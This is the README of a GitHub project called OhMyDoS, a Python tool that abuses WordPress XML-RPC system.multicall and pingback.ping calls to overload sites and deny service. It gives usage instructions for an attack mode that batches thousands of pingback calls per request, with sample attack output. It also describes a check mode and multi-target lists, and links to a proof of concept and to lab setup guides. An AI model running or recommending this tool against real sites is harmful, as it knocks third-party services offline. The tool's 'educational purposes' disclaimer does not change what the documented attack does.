<p align="center">
<img src="https://github.com/martinkubecka/OhMyDoS/blob/master/images/logo.png" alt="Logo">

# :no_entry: OhMyDoS


*OhMyDos* is a python console application abusing [Wordpress](https://wordpress.org/) API called [XML-RPC](https://codex.wordpress.org/XML-RPC_Support) and its functions `system.multicall` and `pingback.ping` with aim of Denial-of-Service. 

---
## :memo: Pre-requisites

- Python3.X ([download](https://www.python.org/downloads/release/python-3102/))
- library called `Random User Agents` ([source code](https://github.com/Luqman-Ud-Din/random_user_agent))
  - `$ pip install random_user_agent`

---
## :zap: Usage

*OhMyDos* provides 2 operation modes **check** and **attack** with ability to automate targeting of multiple Wordpress websites. 

### Attack Mode

#### Option Flags

Flags | Description
--|--
-e | Number of entries per one `system.multicall` (per one POST request)
-r | Number of POST request per target

#### Single Target

```
$ python3 OhMyDoS.py attack http://pingback.com http://example.com

    ▒█████   ██░ ██     ███▄ ▄███▓▓██   ██▓   ▓█████▄  ▒█████    ██████ 
    ▒██▒  ██▒▓██░ ██▒   ▓██▒▀█▀ ██▒ ▒██  ██▒   ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
    ▒██░  ██▒▒██▀▀██░   ▓██    ▓██░  ▒██ ██░   ░██   █▌▒██░  ██▒░ ▓██▄   
    ▒██   ██░░▓█ ░██    ▒██    ▒██   ░ ▐██▓░   ░▓█▄   ▌▒██   ██░  ▒   ██▒
    ░ ████▓▒░░▓█▒░██▓   ▒██▒   ░██▒  ░ ██▒▓░   ░▒████▓ ░ ████▓▒░▒██████▒▒
    ░ ▒░▒░▒░  ▒ ░░▒░▒   ░ ▒░   ░  ░   ██▒▒▒     ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
    ░ ▒ ▒░  ▒ ░▒░ ░   ░  ░      ░ ▓██ ░▒░     ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
      ░ ░     ░  ░  ░   ░      ░    ▒ ▒         ░    ░   ░   ▒     ░  ░  
    
----------------------------------------------------------------------------
[>] Target : http://example.com
[>] Building 2000 pingback calls per one request
[>] Request size: 243.649 kB

[~] Starting attack, press CTRL+C to stop ...
[>] Requests sent : 159

[~] Attack interrupted by keypress
```

#### Multiple Targets

```
$ python3 OhMyDoS.py attack http://pingback.com targets.txt
```

### Check Mode

#### Single Target

```
$ python3 OhMyDoS.py check http://example.com

    ▒█████   ██░ ██     ███▄ ▄███▓▓██   ██▓   ▓█████▄  ▒█████    ██████ 
    ▒██▒  ██▒▓██░ ██▒   ▓██▒▀█▀ ██▒ ▒██  ██▒   ▒██▀ ██▌▒██▒  ██▒▒██    ▒ 
    ▒██░  ██▒▒██▀▀██░   ▓██    ▓██░  ▒██ ██░   ░██   █▌▒██░  ██▒░ ▓██▄   
    ▒██   ██░░▓█ ░██    ▒██    ▒██   ░ ▐██▓░   ░▓█▄   ▌▒██   ██░  ▒   ██▒
    ░ ████▓▒░░▓█▒░██▓   ▒██▒   ░██▒  ░ ██▒▓░   ░▒████▓ ░ ████▓▒░▒██████▒▒
    ░ ▒░▒░▒░  ▒ ░░▒░▒   ░ ▒░   ░  ░   ██▒▒▒     ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░
    ░ ▒ ▒░  ▒ ░▒░ ░   ░  ░      ░ ▓██ ░▒░     ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░
      ░ ░     ░  ░  ░   ░      ░    ▒ ▒         ░    ░   ░   ▒     ░  ░  
    
----------------------------------------------------------------------------
[>] Checking if XML-RPC for http://example.com is enabled ...
[>] XML-RPC enabled.

```

#### Multiple Targets

```
$ python3 OhMyDoS.py check targets.txt
```

---
## :postbox: Resources

- WordPress DoS: Rediscovering an Unpatched 0-Day ([blog post](https://labs.arcturus.net/post/WordPress-DoS.html))
    - PoC : https://github.com/roddux/wordpress-dos-poc (this project is build on the top of this PoC)
- Exploiting the xmlrpc.php on all WordPress versions ([blog post](https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/))

---
## :triangular_ruler: Testing Environment Set Up

- How To Install WordPress with LAMP ([link](https://github.com/martinkubecka/OhMyDoS/blob/master/guides/Wordpress_LAMP.md))
- WordPress in a Docker container ([link](https://github.com/martinkubecka/OhMyDoS/blob/master/guides/Wordpress_Docker.md))

---
## :warning: Disclaimer
  
  > This tool was developed solely for educational purposes only and the author of this tool is no way responsible for any misuse.
